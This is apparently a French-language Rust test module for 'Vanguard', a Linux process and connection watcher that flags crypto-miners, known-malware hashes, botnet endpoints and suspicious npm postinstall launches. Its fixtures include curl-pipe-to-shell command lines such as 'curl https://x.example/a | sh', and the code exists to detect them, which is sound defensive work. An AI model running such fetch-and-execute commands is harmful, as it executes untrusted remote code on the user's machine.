        let ignorer = demande_abonnement(PROC_CN_MCAST_IGNORE, 0x0102_0304);
        assert_eq!(ignorer[..36], ecouter[..36]);
        assert_eq!(ignorer[36..], 2u32.to_ne_bytes());
    }

    /// Un message de sock_diag : inet_diag_msg (famille, état, ports, adresses…) puis, si `protocole`, l'attribut
    /// INET_DIAG_PROTOCOL.
    fn message_prise(famille: u8, locale: (&[u8], u16), distante: (&[u8], u16), protocole: Option<u8>) -> Vec<u8> {
        let mut corps = vec![0u8; 72];
        corps[0] = famille;
        corps[1] = 7;
        corps[4..6].copy_from_slice(&locale.1.to_be_bytes());
        corps[6..8].copy_from_slice(&distante.1.to_be_bytes());
        corps[8..8 + locale.0.len()].copy_from_slice(locale.0);
        corps[24..24 + distante.0.len()].copy_from_slice(distante.0);
        if let Some(p) = protocole {
            corps.extend_from_slice(&5u16.to_ne_bytes());
            corps.extend_from_slice(&INET_DIAG_PROTOCOL.to_ne_bytes());
            corps.extend_from_slice(&[p, 0, 0, 0]);
        }
        let mut o = entete(16 + corps.len(), SOCK_DIAG_BY_FAMILY);
        o.extend(corps);
        o
    }

    #[test]
    fn fins_de_prises() {
        let v4 = message_prise(AF_INET, (&[192, 168, 1, 10], 51000), (&[203, 0, 113, 7], 443), Some(6));
        assert_eq!(
            lire_fins_de_prises(&v4),
            [FinPrise {
                protocole: Some(6),
                locale: "192.168.1.10:51000".parse().unwrap(),
                distante: "203.0.113.7:443".parse().unwrap(),
                etat: 7,
            }]
        );
        let six: Ipv6Addr = "2001:db8::7".parse().unwrap();
        let v6 = message_prise(AF_INET6, (&[0; 16], 5353), (&six.octets(), 53), Some(17));
        let f = &lire_fins_de_prises(&v6)[0];
        assert_eq!((f.protocole, f.distante), (Some(17), SocketAddr::new(six.into(), 53)));
        let mappee: Ipv6Addr = "::ffff:198.51.100.9".parse().unwrap();
        let m = message_prise(AF_INET6, (&[0; 16], 1), (&mappee.octets(), 80), None);
        let f = &lire_fins_de_prises(&m)[0];
        assert_eq!(f.distante.ip(), IpAddr::V4(Ipv4Addr::new(198, 51, 100, 9)));
        assert_eq!(f.protocole, None);
        // Corps tronqué, famille inconnue : rien.
        assert_eq!(lire_fins_de_prises(&v4[..80]), []);
        assert_eq!(
            lire_fins_de_prises(&message_prise(1, (&[0; 4], 1), (&[0; 4], 1), None)),
            []
        );
    }

    proptest! {
        #[test]
        fn aucun_octet_ne_fait_planter(octets in prop::collection::vec(any::<u8>(), 0..400)) {
            let _ = lire_evenements_proc(&octets);
            let _ = lire_fins_de_prises(&octets);
        }

        #[test]
        fn aucun_corps_ne_fait_planter(corps in prop::collection::vec(any::<u8>(), 0..200), genre in prop_oneof![Just(3u16), Just(20u16)]) {
            let mut o = entete(16 + corps.len(), genre);
            o.extend(corps);
            let _ = lire_evenements_proc(&o);
            let _ = lire_fins_de_prises(&o);
        }
    }

    #[test]
    fn version_du_noyau() {
        assert_eq!(noyau_suffisant("6.5.13"), Some(false));
        assert_eq!(noyau_suffisant("6.6"), Some(true));
        assert_eq!(noyau_suffisant("6.10.2"), Some(true));
        assert_eq!(noyau_suffisant("7.1.3-2-arch1"), Some(true));
        assert_eq!(noyau_suffisant("5.15.0-91-generic"), Some(false));
        assert_eq!(noyau_suffisant("abc"), None);
        assert_eq!(noyau_suffisant("6"), None);
    }

    #[test]
    fn lignes_de_commande() {
        assert_eq!(
            ligne_de_commande(b"sh\0-c\0curl x | sh\0").as_deref(),
            Some("sh -c curl x | sh")
        );
        assert_eq!(ligne_de_commande(b""), None);
        assert_eq!(ligne_de_commande(b"\0\0"), None);
    }

    const STATUS: &str = "Name:\tbash\nUmask:\t0022\nState:\tS (sleeping)\nTgid:\t200\nPid:\t200\nPPid:\t100\n";
    const ZOMBIE: &str = "Name:\txmrig\nState:\tZ (zombie)\nPPid:\t100\n";

    #[test]
    fn trois_lectures() {
        let complet = lecture_de(200, Some("/usr/bin/bash".into()), Some(b"bash\0-l\0"), Some(STATUS));
        let Lecture::Complet(p) = complet else {
            panic!("{complet:?}")
        };
        assert_eq!(
            (p.nom.as_str(), p.parent, p.chemin.as_deref(), p.ligne.as_deref()),
            ("bash", Some(100), Some("/usr/bin/bash"), Some("bash -l"))
        );
        let efface = lecture_de(200, Some("/tmp/x (deleted)".into()), None, Some(STATUS));
        assert!(matches!(efface, Lecture::Complet(ref p) if p.sans_fichier && p.chemin.as_deref() == Some("/tmp/x")));
        // Un zombie ne donne plus que son nom, même si une ligne traînait.
        let zombie = lecture_de(201, None, Some(b""), Some(ZOMBIE));
        assert!(matches!(zombie, Lecture::NomSeul(ref p) if p.nom == "xmrig" && p.parent == Some(100)));
        assert!(matches!(lecture_de(202, None, None, None), Lecture::Parti));
        // Un autre compte : la ligne sans le programme.
        let autre = lecture_de(203, None, Some(b"/usr/bin/sleep\x0030\0"), None);
        assert!(matches!(autre, Lecture::Complet(ref p) if p.nom == "sleep" && p.chemin.is_none()));
    }

    #[test]
    fn status_avec_un_nom_qui_n_est_pas_de_l_utf8() {
        // Le noyau écrit le nom court tel quel : un octet 0xff (prctl, nom de fichier) ne doit pas faire perdre le
        // parent ni l'état zombie, donc le jugement sur le nom.
        let octets = b"Name:\tx\xffmrig\nState:\tZ (zombie)\nPPid:\t100\n";
        let status = status_lisible(octets);
        let lu = lecture_de(204, None, Some(b""), Some(&status));
        assert!(
            matches!(lu, Lecture::NomSeul(ref p) if p.nom == "x\u{fffd}mrig" && p.parent == Some(100)),
            "{lu:?}"
        );
        let vivant = status_lisible(b"Name:\t\xfe\nState:\tS (sleeping)\nPPid:\t7\n");
        let lu = lecture_de(205, None, Some(b"/home/alice/a\0"), Some(&vivant));
        assert!(matches!(lu, Lecture::Complet(ref p) if p.parent == Some(7)), "{lu:?}");
    }

    fn en_marche(pid: u32, nom: &str, ligne: Option<&str>) -> EnMarche {
        EnMarche {
            pid,
            parent: Some(1),
            nom: nom.into(),
            chemin: None,
            ligne: ligne.map(str::to_string),
            ..EnMarche::default()
        }
    }

    /// Un programme dont l'empreinte est connue (MalwareBazaar) ressort au veilleur comme au blocage, par la même
    /// voie ; un programme de Vanguard, jamais ; sans liste, le jugement de COM-PRG-001 seul.
    #[test]
    fn empreinte_connue_vue_au_lancement() {
        let dossier = std::env::temp_dir().join(format!("vanguard-veilleur-empreinte-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dossier);
        std::fs::create_dir_all(&dossier).unwrap();
        let fichier = dossier.join("facture");
        std::fs::write(&fichier, b"charge inventee").unwrap();
        let empreinte = crate::protection::empreintes::sha256(&fichier).unwrap();
        let mut fichiers = crate::protection::sources::Fichiers::pour_essai(vec![empreinte]);
        let programme = EnMarche {
            chemin: Some(fichier.to_string_lossy().into_owned()),
            ..en_marche(300, "facture", Some("facture"))
        };
        let alerte = juger_lance_avec(
            &lance(Lecture::Complet(programme.clone()), &["bash"], false),
            &mut fichiers,
        )
        .unwrap();
        assert!(
            alerte.grave && alerte.cle.ends_with(&*fichier.to_string_lossy()),
            "{alerte:?}"
        );
        assert_eq!(
            juger_lance_avec(
                &lance(Lecture::Complet(programme.clone()), &["vanguard"], true),
                &mut fichiers
            ),
            None
        );
        let mut vide = crate::protection::sources::Fichiers::pour_essai(Vec::new());
        assert_eq!(
            juger_lance_avec(&lance(Lecture::Complet(programme), &["bash"], false), &mut vide),
            None
        );
        let _ = std::fs::remove_dir_all(&dossier);
    }

    fn lance(lecture: Lecture, lignee: &[&str], de_vanguard: bool) -> Lance {
        Lance {
            pid: 300,
            parent: Some(299),
            lecture,
            lignee: lignee.iter().map(|n| (*n).to_string()).collect(),
            de_vanguard,
        }
    }

    #[test]
    fn jugement_des_lancements() {
        // Le nom court seul : un outil offensif connu ressort quand même, et c'est dit.
        let a = juger_lance(&lance(
            Lecture::NomSeul(en_marche(300, "xmrig", None)),
            &["xmrig"],
            false,
        ))
        .unwrap();
        assert!(a.grave && a.genre == Genre::Veilleur, "{a:?}");
        assert!(a.texte.contains("Nom court du noyau seulement"), "{}", a.texte);
        // Le postinstall de npm qui télécharge et lance un script.
        let postinstall = en_marche(300, "sh", Some("sh -c curl https://x.example/a | sh"));
        let a = juger_lance(&lance(
            Lecture::Complet(postinstall.clone()),
            &["npm", "node", "sh"],
            false,
        ))
        .unwrap();
        assert!(a.grave, "{a:?}");
        assert!(a.texte.contains("npm → node → sh"), "{}", a.texte);
        // Rien de suspect, Vanguard lui-même, ou rien de lu : aucune alerte.
        assert_eq!(
            juger_lance(&lance(
                Lecture::Complet(en_marche(300, "ls", Some("ls -l"))),
                &["bash", "ls"],
                false
            )),
            None
        );
        assert_eq!(
            juger_lance(&lance(Lecture::Complet(postinstall), &["vanguard", "sh"], true)),
            None
        );
        assert_eq!(juger_lance(&lance(Lecture::Parti, &[], false)), None);
        assert_eq!(juger_lance(&lance(Lecture::NonLu, &[], false)), None);
    }

    #[test]
    fn jugement_des_connexions() {
        let liste = ServeursDeCommande::pour_essai(&[], &[("203.0.113.7".parse().unwrap(), 443, "Emotet")]);
        let fin = |distante: &str| FinPrise {
            protocole: Some(6),
            locale: "192.168.1.10:51000".parse().unwrap(),
            distante: distante.parse().unwrap(),
            etat: 7,
        };
        let a = juger_prise(&fin("203.0.113.7:443"), &liste).unwrap();
        assert!(
            a.grave && a.genre == Genre::Botnet && a.texte.contains("Emotet"),
            "{a:?}"
        );
        assert!(a.texte.contains("TCP"), "{}", a.texte);
        // Le veilleur ne mesure pas la durée d'une connexion : le titre ne la dit pas « brève ».
        assert!(a.titre.contains("fermée") && !a.titre.contains("brève"), "{}", a.titre);
        assert_eq!(juger_prise(&fin("203.0.113.7:80"), &liste), None);
        assert_eq!(juger_prise(&fin("127.0.0.1:443"), &liste), None);
    }

    #[test]
    fn table_bornee_et_lignee() {
        let tous = |_: u32| true;
        let mut t = Table::default();
        t.inserer(1, None, "systemd", false, &tous);
        t.fourche(1, 10, &tous);
        let npm = en_marche(10, "npm", None);
        t.lancement(10, Some(&EnMarche { parent: Some(1), ..npm }), false, &tous);
        t.fourche(10, 11, &tous);
        t.lancement(
            11,
            Some(&EnMarche {
                parent: Some(10),
                ..en_marche(11, "node", None)
            }),
            false,
            &tous,
        );
        t.fourche(11, 12, &tous);
        t.lancement(
            12,
            Some(&EnMarche {
                parent: Some(11),
                ..en_marche(12, "sh", None)
            }),
            false,
            &tous,
        );
        assert_eq!(t.lignee(12), ["systemd", "npm", "node", "sh"]);
        t.fourche(12, 13, &tous);
        t.lancement(
            13,
            Some(&EnMarche {
                parent: Some(12),
                ..en_marche(13, "curl", None)
            }),
            false,
            &tous,
        );
        assert_eq!(t.lignee(13), ["npm", "node", "sh", "curl"], "quatre au plus");
        // Une boucle de parents s'arrête.
        t.inserer(20, Some(21), "a", false, &tous);
        t.inserer(21, Some(20), "b", false, &tous);
        assert_eq!(t.lignee(20), ["b", "a"]);
        // Vanguard et sa descendance.
        t.inserer(30, Some(1), "vanguard", true, &tous);
        t.fourche(30, 31, &tous);
        t.lancement(
            31,
            Some(&EnMarche {
                parent: Some(30),
                ..en_marche(31, "notify-send", None)
            }),
            false,
            &tous,
        );
        assert!(t.de_vanguard(31) && !t.de_vanguard(12));
        // La fin vide la fiche.
        t.fin(13);
        assert!(!t.fiches.contains_key(&13));
        // Bornée : les disparus d'abord, puis les plus anciens.
        let mut t = Table::default();
        for pid in 0..u32::try_from(TABLE_MAX + 50).unwrap() {
            t.inserer(pid, None, "x", false, &tous);
        }
        assert!(t.fiches.len() <= TABLE_MAX);
        assert!(t.ordre.len() <= 2 * TABLE_MAX + 1);
        assert!(!t.fiches.contains_key(&0) && t.fiches.contains_key(&u32::try_from(TABLE_MAX + 49).unwrap()));
        // Pleine de nouveau, avec une moitié de disparus : le balayage les retire tous.
        let mut pid = u32::try_from(TABLE_MAX + 50).unwrap();
        while t.fiches.len() < TABLE_MAX {
            t.inserer(pid, None, "x", false, &tous);
            pid += 1;
        }
        let pairs = |p: u32| p.is_multiple_of(2);
        t.inserer(u32::MAX, None, "y", false, &pairs);
        assert!(t.fiches.len() < TABLE_MAX / 2 + 10);
        // Un nom fabriqué est borné.
        t.inserer(5, None, "ééééééééééééééééé", false, &tous);
        assert!(t.fiches[&5].nom.len() <= NOM_MAX);
    }

    #[test]
    fn table_pleine_de_vivants_balayee_rarement() {
        // Une fork bomb : tous les processus vivent. Un balayage (un stat par fiche) ne revient qu'après au moins
        // TABLE_MAX/8 nouvelles fiches, au lieu d'un à chaque fourche.
        let stats = std::cell::Cell::new(0usize);
        let tous = |_: u32| {
            stats.set(stats.get() + 1);
            true
        };
        let mut t = Table::default();
        t.inserer(1, None, "vanguard", true, &tous);
        for pid in 2..=u32::try_from(TABLE_MAX).unwrap() {
            t.inserer(pid, Some(1), "x", false, &tous);
        }
        assert_eq!((t.fiches.len(), stats.get()), (TABLE_MAX, 0));
        let mut pid = 1_000_000;
        for _ in 0..TABLE_MAX / 8 {
            t.fourche(pid - 1, pid, &tous);
            pid += 1;
        }
        assert_eq!(
            stats.get(),
            TABLE_MAX,
            "un seul balayage pour {} fourches",
            TABLE_MAX / 8
        );
        assert!(t.fiches.len() <= TABLE_MAX);
        for _ in 0..TABLE_MAX / 8 {
            t.fourche(pid - 1, pid, &tous);
            pid += 1;
        }
        assert!(stats.get() <= 2 * TABLE_MAX, "{}", stats.get());
        // La racine, la plus ancienne de toutes, n'a pas été oubliée.
        assert!(t.fiches.get(&1).is_some_and(|f| f.racine));
    }

    #[test]
    fn la_marque_de_vanguard_ne_se_transmet_pas() {
        let tous = |_: u32| true;
        let mut t = Table::default();
        t.inserer(1, None, "systemd", false, &tous);
        t.inserer(30, Some(1), "vanguard", true, &tous);
        // Vanguard ouvre le tableau de bord : xdg-open, puis le navigateur.
        t.fourche(30, 40, &tous);
        let lu = |pid: u32, parent: u32, nom: &str| EnMarche {
            parent: Some(parent),
            ..en_marche(pid, nom, None)
        };
        t.lancement(40, Some(&lu(40, 30, "xdg-open")), false, &tous);
        t.fourche(40, 41, &tous);
        t.lancement(41, Some(&lu(41, 40, "firefox")), false, &tous);
        assert!(t.de_vanguard(40) && t.de_vanguard(41));
        // xdg-open se termine : le navigateur est rattaché ailleurs, et ce qu'il lance ensuite est jugé.
        t.fin(40);
        assert!(!t.de_vanguard(41));
        t.fourche(41, 42, &tous);
        t.lancement(42, Some(&lu(42, 41, "sh")), false, &tous);
        assert!(!t.de_vanguard(42));
        let l = lance(
            Lecture::Complet(en_marche(42, "sh", Some("sh -c curl https://x.example/a | sh"))),
            &["firefox", "sh"],
            t.de_vanguard(42),
        );
        assert!(juger_lance(&l).is_some());
        // Un processus de Vanguard qui lance autre chose n'est plus une racine ; ses enfants ne le sont jamais.
        t.fourche(30, 50, &tous);
        assert!(t.de_vanguard(50) && !t.fiches[&50].racine);
        t.lancement(30, Some(&lu(30, 1, "bash")), false, &tous);
        assert!(!t.de_vanguard(30) && !t.de_vanguard(50));
        // Une boucle de parents ou une chaîne trop longue s'arrête, sans racine.
        t.inserer(60, Some(61), "a", false, &tous);
        t.inserer(61, Some(60), "b", false, &tous);
        assert!(!t.de_vanguard(60));
        t.inserer(1000, None, "vanguard", true, &tous);
        for p in 1001..1100 {
            t.inserer(p, Some(p - 1), "x", false, &tous);
        }
        assert!(t.de_vanguard(1000 + u32::try_from(CHAINE_MAX).unwrap() - 1));
        assert!(!t.de_vanguard(1099));
    }

    #[test]
    fn un_tour_rend_toujours_la_main() {
        let jamais = || false;
        // Une inondation sans fin sur les deux flux : le tour s'arrête au budget de chacun, en les lisant à tour de
        // rôle (les fins de prises ne passent pas après tout le connecteur).
        let mut lus = Vec::new();
        a_tour_de_role(&[true, true], 5, Duration::from_secs(60), &jamais, |i| {
            lus.push(i);
            Ok(true)
        })
        .unwrap();
        assert_eq!(lus, [0, 1, 0, 1, 0, 1, 0, 1, 0, 1]);
        // Un flux vide s'arrête, l'autre continue jusqu'à son budget ; un flux pas prêt n'est pas lu.
        let mut lus = Vec::new();
        a_tour_de_role(&[true, true], 4, Duration::from_secs(60), &jamais, |i| {
            lus.push(i);
            Ok(i == 0)
        })
        .unwrap();
        assert_eq!(lus, [0, 1, 0, 0, 0]);
        let mut lus = Vec::new();
        a_tour_de_role(&[false, true], 3, Duration::from_secs(60), &jamais, |i| {
            lus.push(i);
            Ok(true)
        })
        .unwrap();
        assert_eq!(lus, [1, 1, 1]);
        // L'arrêt demandé, ou la durée du tour, l'arrête tout de suite, même avec du budget.
        let mut n = 0;
        a_tour_de_role(&[true], usize::MAX, Duration::from_secs(60), &|| true, |_| {
            n += 1;
            Ok(true)
        })
        .unwrap();
        assert_eq!(n, 1);
        let debut = Instant::now();
        a_tour_de_role(&[true], usize::MAX, Duration::from_millis(20), &jamais, |_| Ok(true)).unwrap();
        assert!(debut.elapsed() < Duration::from_secs(5));
        // Une erreur remonte.
        assert_eq!(
            a_tour_de_role(&[true, true], 10, Duration::from_secs(60), &jamais, |i| if i == 1 {
                Err(libc::EIO)
            } else {
                Ok(true)
            }),
            Err(libc::EIO)
        );
        assert!(MESSAGES_PAR_TOUR > 0 && DUREE_DE_TOUR < Duration::from_secs(1));
    }

    #[test]
    fn refus_passagers_relances() {
        assert_eq!(resultat_de_l_accuse(0), Ok(()));
        assert_eq!(resultat_de_l_accuse(1), Err(Refus::Interdit));
        for err in [libc::ENOMEM, libc::EAGAIN, libc::ENOBUFS] {
            assert_eq!(resultat_de_l_accuse(err.unsigned_abs()), Err(Refus::Passager));
        }
        assert_eq!(resultat_de_l_accuse(22), Err(Refus::Erreur(22)));
        // Sans accusé : passager après une perte, définitif sans, arrêt d'abord.
        assert_eq!(refus_sans_accuse(false, true), Refus::Passager);
        assert_eq!(refus_sans_accuse(false, false), Refus::SansAccuse);
        assert_eq!(refus_sans_accuse(true, true), Refus::Arrete);
        // 77 (jamais relancé) seulement quand relancer n'y changerait rien.
        for r in [Refus::Absent, Refus::Interdit, Refus::SansAccuse] {
            assert_eq!(r.sortie(), SORTIE_REFUS, "{r:?}");
        }
        for r in [Refus::Passager, Refus::Erreur(libc::EIO)] {
            assert_eq!(r.sortie(), 1, "{r:?}");
        }
        assert_eq!(Refus::Arrete.sortie(), 0);
        for r in [Refus::Passager, Refus::Arrete] {
            assert_ne!(r.raison(), "");
        }
        // Une demande renvoyée a un jeton à elle.
        let premier = jeton_d_abonnement();
        let mut jetons = vec![premier, premier.wrapping_add(2) | 0x8000_0000];
        for _ in 0..DEMANDES_MAX {
            let j = nouveau_jeton(&jetons);
            assert!(!jetons.contains(&j) && (0x8000_0000..u32::MAX).contains(&j));
            jetons.push(j);
        }
    }

    #[test]
    fn unite_etrangere_jamais_ecrasee() {
        assert_eq!(
            place_libre(Err(std::io::Error::from(std::io::ErrorKind::NotFound))),
            Ok(())
        );
        assert_eq!(place_libre(Ok(unite_dans("/x", false).into_bytes())), Ok(()));
        assert_eq!(place_libre(Ok(unite_dans("/x", true).into_bytes())), Ok(()));
        let etrangere = place_libre(Ok(b"[Unit]\nDescription=celle d'alice\n".to_vec())).unwrap_err();
        assert!(etrangere.contains("rien n'est posé"), "{etrangere}");
        assert!(place_libre(Ok(vec![0xff, 0xfe])).is_err());
        assert!(place_libre(Err(std::io::Error::from(std::io::ErrorKind::PermissionDenied))).is_err());
    }

    #[test]
    fn debit_borne() {
        let mut d = Debit::default();
        let t0 = 1_800_000_000;
        assert_eq!(d.decider("a", true, t0), Decision::Noter { notifier: true });
        assert_eq!(d.decider("a", true, t0 + 3600), Decision::Repete);
        assert_eq!(
            d.decider("a", true, t0 + REDIRE_APRES),
            Decision::Noter { notifier: true }
        );
        // Trois notifications par tranche de 10 minutes : les autres sont notées sans notification.
        assert_eq!(
            d.decider("b", true, t0 + REDIRE_APRES),
            Decision::Noter { notifier: true }
        );
        assert_eq!(
            d.decider("c", true, t0 + REDIRE_APRES),
            Decision::Noter { notifier: true }
        );
        assert_eq!(
            d.decider("d", true, t0 + REDIRE_APRES),
            Decision::Noter { notifier: false }
        );
        assert_eq!(
            d.decider("e", false, t0 + REDIRE_APRES + 700),
            Decision::Noter { notifier: false }
        );
        assert_eq!(
            d.decider("f", true, t0 + REDIRE_APRES + 700),
            Decision::Noter { notifier: true }
        );
        // Dix par heure au journal : 1 (t0) + 6 dans cette heure-ci, puis 4 de plus, puis plus rien.
        let h = t0 + REDIRE_APRES + 800;
        for i in 0..4 {
            assert!(matches!(d.decider(&format!("g{i}"), false, h), Decision::Noter { .. }));
        }
        assert_eq!(d.decider("trop", false, h), Decision::Taire);
        // Le résumé : une fois, puis plus avant une heure.
        assert_eq!(d.resume(h), Some(1));
        assert_eq!(d.decider("trop2", false, h + 10), Decision::Taire);
        assert_eq!(d.resume(h + 10), None);
        assert_eq!(d.resume(h + 3600), Some(1));
        assert_eq!(d.resume(h + 7200), None);
        // Vingt par jour : l'heure suivante en note encore 9, puis plus rien jusqu'au lendemain.
        let h2 = h + 3600;
        let notees = (0..15)
            .filter(|i| matches!(d.decider(&format!("j{i}"), false, h2), Decision::Noter { .. }))
            .count();
        assert_eq!(notees, 20 - 11);
        assert_eq!(
            d.decider("lendemain", false, t0 + REDIRE_APRES + 86_400 + 900),
            Decision::Noter { notifier: false }
        );
        // Les clés gardées sont bornées.
        for i in 0..(DEJA_MAX + 10) {
            let _ = d.decider(&format!("k{i}"), false, h2 + 1);
        }
        assert!(d.deja.len() <= DEJA_MAX);
    }

    fn etat_vivant() -> Etat {
        Etat {
            pid: 42,
            depuis: 1_800_000_000,
            battement: 1_800_000_000,
            lancements: 120,
            lus: 110,
            noms_seuls: 4,
            partis: 6,
            ..Etat::default()
        }
    }

    /// `juger_etat` d'avant les défenses voulues : voulu ou jamais voulu, rien de douteux, pas de veille des fichiers.
    fn juger_bool(
        voulu: bool,
        activee: Option<bool>,
        etat: Option<&Etat>,
        vivant: bool,
        noyau: Option<bool>,
    ) -> Constat {
        let v = if voulu {
            voulues::Verdict::Voulue
        } else {
            voulues::Verdict::PasVoulue(None)
        };
        juger_etat(
            &v,
            activee,
            etat,
            vivant,
            noyau,
            None,
            &voulues::Verdict::PasVoulue(None),
        )
    }

    /// Le veilleur voulu un jour, sa marque effacée avec son unité : coupé hors de Vanguard, jamais « comme par
    /// défaut » ; l'état des défenses voulues forgé : non vérifié, jamais vert ; arrêté par Vanguard : coupé, dit.
    #[test]
    fn veilleur_coupe_hors_de_vanguard() {
        use voulues::{Doute, Verdict as V};
        let pas = V::PasVoulue(None);
        let c = juger_etat(
            &V::CoupeeHors(Some("2026-10-01".into())),
            Some(false),
            None,
            false,
            Some(true),
            None,
            &pas,
        );
        assert_eq!(c.probleme, Some(Niveau::Eleve), "{}", c.message);
        assert!(c.message.contains("sans passer par Vanguard"), "{}", c.message);
        let c = juger_etat(
            &V::NonVerifiee(Doute::HorsVanguard),
            Some(false),
            None,
            false,
            Some(true),
            None,
            &pas,
        );
        assert!(!c.verifie && c.probleme.is_some(), "{}", c.message);
        let c = juger_etat(
            &V::PasVoulue(Some("2026-10-02".into())),
            Some(false),
            None,
            false,
            Some(true),
            None,
            &pas,
        );
        assert!(
            c.verifie && c.probleme.is_none() && c.message.contains("2026-10-02"),
            "{}",
            c.message
        );
        assert!(!c.message.contains("comme par défaut"), "{}", c.message);
        // Le dossier jetable : marque effacée, unité absente, état scellé « voulu » → coupé hors de Vanguard.
        let d = crate::socle::dossier_local().join("veilleur-coupe-hors");
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        voulues::noter_dans(&d, Defense::Veilleur, true, false).unwrap();
        let v = voulues::juger(
            d.join(VOULU).is_file(),
            false,
            &voulues::souvenir_dans(&d, Defense::Veilleur),
        );
        assert!(matches!(v, V::CoupeeHors(_)), "{v:?}");
        // Arrêté par Vanguard (« off ») : noté, coupé normalement.
        oublier_le_choix(&Retire::Fait, &d);
        let v = voulues::juger(false, false, &voulues::souvenir_dans(&d, Defense::Veilleur));
        assert!(matches!(v, V::PasVoulue(Some(_))), "{v:?}");
        let _ = std::fs::remove_dir_all(d);
    }

    /// La veille anti-rançongiciel voulue et notée, mais absente du veilleur (sa note effacée avant un redémarrage) :
    /// dite, jamais tue ; l'état douteux : pas de signe vert.
    #[test]
    fn veille_rancon_voulue_mais_absente() {
        use voulues::{Doute, Verdict as V};
        let e = etat_vivant();
        let c = juger_etat(
            &V::Voulue,
            Some(true),
            Some(&e),
            true,
            Some(true),
            None,
            &V::CoupeeHors(Some("2026-10-01".into())),
        );
        assert_eq!(c.probleme, Some(Niveau::Moyen), "{}", c.message);
        let c = juger_etat(
            &V::Voulue,
            Some(true),
            Some(&e),
            true,
            Some(true),
            None,
            &V::NonVerifiee(Doute::Inconnu),
        );
        assert!(!c.verifie, "{}", c.message);
        let en_marche = Etat {
            rancon_actif: true,
            ..e
        };
        let c = juger_etat(
            &V::Voulue,
            Some(true),
            Some(&en_marche),
            true,
            Some(true),
            None,
            &V::Voulue,
        );
        assert!(c.verifie && c.probleme.is_none(), "{}", c.message);
    }

    /// Un état réécrit sans sceau (faux veilleur) n'est pas cru : ni vivant, ni ses programmes gelés rejoués.
    #[test]
    fn etat_forge_pas_cru() {
        let d = crate::socle::dossier_local().join("veilleur-etat-forge");
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        let vrai = serde_json::to_vec(&etat_vivant()).unwrap();
        crate::sceau::ecrire_dans(&d, ETAT, &vrai).unwrap();
        let (lu, doute) = lire_etat_dans(&d);
        assert!(lu.is_some() && doute.is_none());
        let faux = Etat {
            pids_geles: vec![1],
            ..etat_vivant()
        };
        std::fs::write(d.join(ETAT), serde_json::to_vec(&faux).unwrap()).unwrap();
        let (lu, doute) = lire_etat_dans(&d);
        assert!(lu.is_none() && doute.is_some(), "{doute:?}");
        // Au bilan : allumé mais non vérifié, avec la raison.
        let c = juger_etat(
            &voulues::Verdict::Voulue,
            Some(true),
            None,
            false,
            Some(true),
            doute.as_deref(),
            &voulues::Verdict::PasVoulue(None),
        );
        assert!(!c.verifie && c.message.contains("hors de Vanguard"), "{}", c.message);
        let _ = std::fs::remove_dir_all(d);
    }

    /// Le veilleur d'avant une mise à jour : la ligne de commande du veilleur, l'image du programme de l'unité effacée
    /// depuis (« (deleted) ») et un nouveau fichier à sa place. Reconnu, et dit en information, jamais « falsifié » ni
    /// « à l'arrêt » ; le même processus sans image effacée ne l'est pas.
    #[test]
    fn veilleur_d_avant_une_mise_a_jour() {
        let d = crate::socle::dossier_local().join("veilleur-d-avant");
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        let prog = d.join("vanguard");
        std::fs::copy("/bin/sh", &prog).unwrap();
        // « ; : » : le shell ne remplace pas son image par sleep.
        let mut enfant = std::process::Command::new(&prog)
            .args(["-c", "sleep 30; :", "veilleur", "--servir"])
            .spawn()
            .unwrap();
        let etat = Etat {
            pid: enfant.id(),
            battement: maintenant(),
            ..Etat::default()
        };
        std::fs::write(d.join(ETAT), serde_json::to_vec(&etat).unwrap()).unwrap();
        // Encore le même programme : pas d'avant une mise à jour.
        std::thread::sleep(Duration::from_millis(100));
        assert_eq!(ancien_veilleur(&d, Some(&prog)), None);
        // Mis à jour : l'ancien fichier part, un nouveau prend sa place.
        std::fs::remove_file(&prog).unwrap();
        std::fs::write(&prog, b"nouvelle version").unwrap();
        assert_eq!(ancien_veilleur(&d, Some(&prog)), Some(enfant.id()));
        assert_eq!(ancien_veilleur(&d, None), None);
        let _ = enfant.kill();
        let _ = enfant.wait();
        let c = juger_ancien(42);
        assert!(c.probleme == Some(Niveau::Info) && !c.verifie, "{}", c.message);
        assert!(c.message.contains("avant une mise à jour"), "{}", c.message);
        let _ = std::fs::remove_dir_all(d);
    }

    /// La marque de la veille anti-rançongiciel d'une version d'avant est adoptée à la mise à jour (rien encore de
    /// noté) : effacée ensuite, la veille reste voulue. Posée par un autre programme une fois l'état tenu, elle
    /// n'allume rien : la veille qui gèle ne s'allume que par le geste (relecture S2c, Fable 6).
    #[test]
    fn marques_d_avant_adoptees() {
        let d = std::env::temp_dir().join(format!("vanguard-marques-d-avant-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        voulues::adopter_d_avant_dans(&d, Defense::Rancongiciel);
        assert!(matches!(
            voulues::souvenir_dans(&d, Defense::Rancongiciel),
            voulues::Souvenir::Voulue(_)
        ));
        let d2 = d.join("ensuite");
        std::fs::create_dir_all(&d2).unwrap();
        voulues::noter_dans(&d2, Defense::Surveillance, true, false).unwrap();
        voulues::adopter_d_avant_dans(&d2, Defense::Rancongiciel);
        assert_eq!(
            voulues::souvenir_dans(&d2, Defense::Rancongiciel),
            voulues::Souvenir::Jamais
        );
        let _ = std::fs::remove_dir_all(&d);
    }

    /// Le processus noté doit lancer le programme de l'unité : celui de ce test lance son propre programme, pas un
    /// autre ; sans unité de Vanguard, rien n'est cru.
    #[test]
    fn processus_juge_sur_son_image() {
        let moi = std::process::id();
        let exe = std::env::current_exe().unwrap();
        assert!(lance_le_programme(moi, Some(&exe)));
        assert!(!lance_le_programme(moi, Some(std::path::Path::new("/bin/sh"))));
        assert!(!lance_le_programme(moi, None));
        assert!(!lance_le_programme(0, Some(&exe)));
        // Battement frais et ligne de commande imitée ne suffisent pas sans l'image.
        let e = Etat {
            pid: moi,
            battement: maintenant(),
            ..Etat::default()
        };
        assert!(!vivant_selon(&e, maintenant(), Some(std::path::Path::new("/bin/sh"))));
    }

    /// Un retrait raté garde la note du choix et l'état : le bilan dit alors l'écart, jamais « coupé ». Réussi ou
    /// seulement non confirmé, ils partent. Dans un dossier à lui, pas celui des autres tests.
    #[test]
    fn retrait_rate_garde_le_choix() {
